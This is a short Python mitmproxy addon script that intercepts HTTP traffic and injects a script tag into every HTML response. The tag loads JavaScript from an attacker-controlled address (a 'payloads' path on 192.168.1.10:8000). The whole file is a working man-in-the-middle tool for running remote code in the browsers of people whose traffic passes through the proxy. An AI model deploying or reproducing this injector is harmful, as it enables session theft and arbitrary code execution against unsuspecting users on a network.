# Usage: mitmdump -s "js_injector.py src"
# (this script works best with --anticache)
from bs4 import BeautifulSoup
from mitmproxy import ctx, http
import argparse

def response(flow: http.HTTPFlow) -> None:
    print("response")
    path="http://192.168.1.10:8000/payloads/script.js"
    if path:
        html = BeautifulSoup(flow.response.content, "html.parser")
        print(path)
        print(flow.response.headers["content-type"])
        if 'text/html'in flow.response.headers["content-type"] :
            script = html.new_tag(
                "script",
                src=path,
                type='application/javascript')
            html.html.insert(0, script)
            flow.response.content = str(html).encode("utf8")
            print("Script injected.")
